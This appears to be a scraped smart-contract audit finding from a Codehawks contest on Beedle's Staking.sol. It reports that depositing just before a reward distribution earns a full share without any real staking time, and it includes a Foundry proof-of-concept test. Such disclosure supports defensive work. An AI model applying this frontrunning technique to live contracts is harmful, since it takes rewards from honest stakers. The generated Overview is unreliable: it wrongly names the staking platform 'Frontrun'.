---
# Core Classification
protocol: Beedle - Oracle free perpetual lending
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 34521
audit_firm: Codehawks
contest_link: https://codehawks.cyfrin.io/c/clkbo1fa20009jr08nyyf9wbx
source_link: none
github_link: https://github.com/Cyfrin/2023-07-beedle

# Impact Classification
severity: medium
impact: security_vulnerability
exploitability: 0.00
financial_impact: medium

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 3
finders:
  - Bauer
  - kutu
  - Bernd
---

## Vulnerability Title

Frontrun can get the full reward, no staking time required

### Overview


The report is about a bug in the code for a staking platform called Frontrun. The bug allows anyone to get all the rewards without having to stake their funds for a long time. This means that after receiving the reward, the user can withdraw their funds and conduct other transactions, making it unattractive for users to keep staking their funds. The code for the staking platform can be found on GitHub, and the vulnerability is located in line 61. The bug was discovered using a tool called Foundry. The report recommends using a time-weighted reward allocation algorithm to fix the bug.

### Original Finding Content

### Relevant GitHub Links
<a data-meta="codehawks-github-link" href="https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L61">https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L61</a>


## Summary

Anyone can get all the rewards as long as they call deposit before the reward distribution, without a long time staking, after receiving the reward, the user can withdraw the collateral and conduct other transactions. This would result in no user being willing to keep staking collateral.

## Vulnerability Details

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "solady/src/tokens/ERC20.sol";
import "../src/Staking.sol";

contract SERC20 is ERC20 {
    function name() public pure override returns (string memory) {
        return "Test ERC20";
    }

    function symbol() public pure override returns (string memory) {
        return "TERC20";
    }

    function mint(address _to, uint256 _amount) public {
        _mint(_to, _amount);
    }
}

contract StakingTest is Test {
    SERC20 st;
    SERC20 weth;
    Staking staking;

    function setUp() public {
        st = new SERC20();
        weth = new SERC20();
        staking  = new Staking(address(st), address(weth));
    }
    
    function testDeposit() public {
        address alice = makeAddr("Alice");
        address bob = makeAddr("Bob");

        deal(address(st), address(alice), 2 ether);
        deal(address(st), address(bob), 2 ether);

        vm.startPrank(bob);
        st.approve(address(staking), 2 ether);
        staking.deposit(2 ether);
        vm.stopPrank();

        vm.roll(100);

        vm.startPrank(alice);
        st.approve(address(staking), 2 ether);
        staking.deposit(2 ether);
        vm.stopPrank();

        deal(address(weth), address(staking), weth.balanceOf(address(staking)) + 1 ether);

        vm.startPrank(alice);
        staking.claim();
        vm.stopPrank();
        vm.startPrank(bob);
        staking.claim();
        vm.stopPrank();
        // @audit Although Bob staking 100 blocks, Alice only needed to frontrun to get the same reward
        assertEq(weth.balanceOf(alice), weth.balanceOf(bob));
    }
}
```

## Impact

Frontrun can get the full reward, which harms the interests of the staking users.

## Tools Used

Foundry

## Recommendations

Use time-weighted reward allocation algorithm.

### Metadata

| Field | Value |
|-------|-------|
| Impact | MEDIUM |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Codehawks |
| Protocol | Beedle - Oracle free perpetual lending |
| Report Date | N/A |
| Finders | Bauer, kutu, Bernd |

### Source Links

- **Source**: N/A
- **GitHub**: https://github.com/Cyfrin/2023-07-beedle
- **Contest**: https://codehawks.cyfrin.io/c/clkbo1fa20009jr08nyyf9wbx

### Keywords for Search

`vulnerability`

